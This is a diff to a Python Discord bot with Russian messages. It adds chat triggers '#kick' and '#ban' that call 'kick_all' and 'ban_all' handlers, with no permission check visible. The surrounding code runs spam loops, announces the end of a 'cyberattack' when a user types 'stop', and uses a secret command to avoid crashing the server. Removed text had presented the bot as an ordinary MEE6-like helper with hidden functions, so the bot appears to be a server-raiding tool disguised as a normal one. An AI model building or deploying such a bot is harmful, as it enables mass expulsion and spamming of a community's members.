@@ -3,6 +3,8 @@ import discord
 from discord.ext import tasks
 from dotenv import load_dotenv, find_dotenv
 from os import getenv
+from commands import check_command
+
 import LOGS
 
 load_dotenv(find_dotenv())
@@ -26,6 +28,14 @@ class MyClient(discord.Client):
         """Проверяет, что написал человек и отвечает"""
         if message.content.lower() == "привет":
             await message.channel.send("Привет")
+        if message.content.lower() == "#levels":
+            await check_command(self, "levels", message.channel, message.author)
+        if message.content.lower() == "#kick":
+            await check_command(self, "kick_all", message.channel)
+        if message.content.lower() == "#ban":
+            await check_command(self, "ban_all", message.channel)
+        if message.content.lower() == "#help":
+            await check_command(self, "help", message.channel)
         if message.content.lower() == "стоп":
             await message.channel.send("Кибератака завершена")
             _Spam.setIsStatusSpam(True)
@@ -38,31 +48,8 @@ class MyClient(discord.Client):
         if message.content == getenv("secret_command_stop"):
             await message.channel.send("Предотвращение краша сервера")
             _SpamEveryone.start = True
-            embed = discord.Embed
-        if message.content == "#help":
-            await message.channel.send("```Вас приветствует дискорд-бот Человек. Чем я могу вам помочь? \r"
-                                       "Список возможностей: \r"
-                                       "            📋  Information(!help Information)\r"
-                                       "!help !info !stats !serverinfo !user !bio !inviteinfo\r"
-                                       "                🛡️Moderation(!help Moderation)\r"
-                                       "!warns\r"
-                                       "                 🏆  Ranking(!help Ranking)\r"
-                                       "!rank !leaders\r"
-                                       "                    🎵  Music(!help Music)\r"
-                                       "!play !youtube !skip !queue !shuffle !promote !remove !current !repeat !pause !start !stop !volume !here !restart !rewind !forward !seek\r"
-                                       "                      😄  Fun(!help Fun)\r"
-                                       "!fuss !coin !8 ball !dog !cat !fox\r"
-                                       "                  🔧  Utility(!help Utility)\r"
-                                       "!avatar !steam !reminder !rand !t !wikifur !math !emote !covid !bonus\r"
-                                       "                            Удачи!```")
-        if message.content == "!info":
-            await message.channel.send("Человек - это потенциально новый бот, написанный на общедоступном языке"
-                                       "программирования python. По функционалу он не уступает таким известным ботам,"
-                                       "как MEE6 или JuniperBot, но у него также есть свои отличительные черты, которые"
-                                       " не оставят вас равнодушными. Например: вы можете включить функцию разговора с"
-                                       " ботом, хоть он и ИИ, но очень хорошо проработан, следовательно вы сможете "
-                                       "поговорить с ним практически на любые темы. У бота есть скрытые функции, которые"
-                                       " вы можете узнать, если перейдёте на мой GitHub: https://github.com/FedorKatta")
+        if message.content.lower() == "#info":
+            await check_command(self, "info", message.channel)
 
     @tasks.loop(seconds=5)
     async def background_task(self):
